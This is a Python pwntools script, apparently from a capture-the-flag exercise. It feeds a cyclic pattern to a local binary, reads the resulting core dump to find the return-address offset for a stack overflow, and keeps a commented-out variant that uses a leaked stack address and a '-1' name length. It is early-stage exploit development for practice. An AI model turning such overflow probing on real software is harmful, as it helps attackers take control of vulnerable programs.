
from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

#padding_length = 56
#ret_offset = -96

log.info('Create IO')
#io = remote('', )
io = process('/home/kali/Downloads/reg')


payload = cyclic(200)

log.info('Send Payload')
io.sendlineafter('name : ', payload)

io.wait()

core = io.corefile
stack = core.rsp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
info("cyclic pattern = %s", pattern.decode())
rip_offset = cyclic_find(pattern)
info("rip offset is = %d", rip_offset)

info("mappings are = %s", core.mappings)

io.interactive()


#stack_address = io.recvline().decode().strip().split()[-1][2:]
#stack_address = bytes.fromhex(stack_address).rjust(8, b'\x00')
#stack_address = u64(stack_address, endian='big')
#stack_address += ret_offset
#log.success(f'Leaked stack address: {p64(stack_address)}')
#
#log.info('Send email and age')
#io.sendlineafter(': ', 'email')
#io.sendlineafter(': ', 'age')
#log.info('Send Name Lenght')
#io.sendlineafter(': ', '-1')
#
#payload = cyclic(200)
#
#log.info('Send payload to name')
#io.sendlineafter('Name: ', payload)
#
#io.wait()
#
#core = io.corefile
#stack = core.rsp
#info("rsp = %#x", stack)
#pattern = core.read(stack, 4)
#info("cyclic pattern = %s", pattern.decode())
#rip_offset = cyclic_find(pattern)
#info("rip offset is = %d", rip_offset)
#
#io.interactive()
#